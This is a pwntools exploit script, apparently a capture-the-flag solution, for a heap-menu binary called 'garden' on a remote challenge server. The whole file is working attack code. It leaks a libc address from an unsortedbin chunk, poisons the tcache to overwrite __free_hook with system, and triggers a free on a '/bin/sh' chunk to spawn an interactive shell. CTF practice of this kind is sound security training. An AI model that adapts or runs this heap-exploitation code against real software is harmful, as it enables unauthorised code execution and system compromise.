from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./garden')
libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6')

debug = 0

if debug:
    io = process('./garden')
else:
    io = remote('scr1w.dlut.edu.cn',28018)
def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget= [0xe3b2e,0xe3b31,0xe3b34]

def add(idx,content):
    io.sendlineafter(b">> ",str(1))
    io.sendlineafter(b"tree index?",str(idx))
    io.sendafter(b"tree name?",content)

def delete(idx):
    io.sendlineafter(b">> ",str(2))
    io.sendlineafter(b"tree index?",str(idx))

def show(idx):
    io.sendlineafter(b">> ",str(3))
    io.sendlineafter(b"tree index?",str(idx))

for i in range(9):
    add(i,b'a' * 0x8) # victim 7, after 8

#io.sendlineafter(b">> ",str(6))

for i in range(6):
    delete(i)
delete(8) # padding

io.sendlineafter(b">> ",str(5))
io.sendlineafter(b"which tree do you want to steal?",str(7)) # steal victim 进unsortedbin

show(7)
libc.base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1ecbe0
malloc_hook = libc.base + 0x1ecb70
free_hook = libc.base + 0x1eee48
success("libc.base -->" + hex(libc.base))
success("malloc_hook -->" + hex(malloc_hook))
delete(6) # 合并到unsortedbin
add(8,b'a'* 8)
#p()
delete(7) # 进tcache
#p()
io.sendlineafter(b">> ",str(6))
add(7,b'a'*6)
#p()
for i in range(6):
    add(i,b"/bin/sh")
add(6,b'a')
#p()
delete(0)
delete(1)
delete(7)
delete(6)
payload = p64(0x41) * 27 + p64(0x111) + p64(free_hook)
add(6,payload)
add(0,b'aaa')
payload = p64(0x522c0 + libc.base) # system
add(1,payload)
#p()
delete(2)

io.interactive()

